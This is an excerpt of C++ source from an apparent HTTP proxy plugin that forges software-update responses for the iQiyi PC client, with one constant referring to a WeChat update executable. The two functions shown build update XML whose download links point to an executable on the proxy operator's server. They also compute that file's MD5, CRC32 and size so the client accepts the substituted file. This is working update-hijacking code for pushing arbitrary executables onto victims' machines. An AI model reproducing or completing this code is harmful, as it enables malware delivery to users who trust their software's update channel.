...
int IqiyiPlugin::replyPcUpdate(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	...
	char * lpRespContentFormat =
		...
		//"<update_group>\r\n"
		"<update clientmaxver=\"%s\" crc32=\"%s\" "
		"cubelink=\"http://%s/%s\" "
		"filesize=\"%u\" httplink=\"%s\" "
		"md5=\"%s\" name=\"%s\" enable=\"1\" usehttp=\"0\" probability=\"100\" seed=\"20990817\" action=\"0\">\r\n"
	...
	string crc = CryptoUtils::FileCrc32(newfn, 1024, 2);

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, TRUE);

	string localip = HttpUtils::getIPstr(gServerIP);
	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string httplink = string(lphttp->username) + "/" + WEIXIN_PC_UPDATE_EXE_FILENAME;

	//sprintf_s第二个参数必须跟实际可用缓冲区大小一致，否则异常
	...
	int iRespContentLen = sprintf_s(lpRespContent, 0x2000, lpRespContentFormat,
		...
		updatever.c_str(),updatever.c_str(),updatever.c_str(), updatever.c_str(), updatever.c_str());
...
int IqiyiPlugin::replyIqiyiPcExe(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	...
	char * lpRespContentFormat =
		...
		"</Path>\r\n"
		"<update enable=\"1\" name=\"%s\" usehttp=\"0\" httplink=\"%s\" md5=\"%s\" crc32=\"%s\" filesize=\"%u\" cubelink=\"http://%s/%s\" probability=\"40\" seed=\"30010820\" clientminver=\"1.1.11.1111\" clientmaxver=\"9.9.99.9999\" >\r\n"
	...
	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;
	string httplink = string(lphttp->username) + "/" + filename;
	...
	string crc = CryptoUtils::FileCrc32( fn, 1024, 2);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		filename.c_str(), httplink.c_str(), szmd5, crc.c_str(), filesize, szip.c_str(), filename.c_str());
